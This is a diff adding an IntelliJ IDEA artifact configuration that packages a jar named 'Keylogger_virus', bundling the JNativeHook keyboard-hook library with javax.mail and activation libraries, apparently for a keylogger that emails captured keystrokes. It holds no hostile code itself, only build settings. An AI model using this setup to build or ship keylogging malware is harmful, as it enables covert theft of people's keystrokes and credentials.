@@ -1,0 +1,11 @@
+<component name="ArtifactManager">
+  <artifact type="jar" name="Keylogger_virus:jar">
+    <output-path>$PROJECT_DIR$/out/artifacts/Keylogger_virus_jar</output-path>
+    <root id="archive" name="Keylogger_virus.jar">
+      <element id="module-output" name="Keylogger_virus" />
+      <element id="extracted-dir" path="$PROJECT_DIR$/libs/javax.mail.jar" path-in-jar="/" />
+      <element id="extracted-dir" path="$PROJECT_DIR$/libs/JNativeHook.jar" path-in-jar="/" />
+      <element id="extracted-dir" path="$PROJECT_DIR$/libs/activation-1.1.1.jar" path-in-jar="/" />
+    </root>
+  </artifact>
+</component>
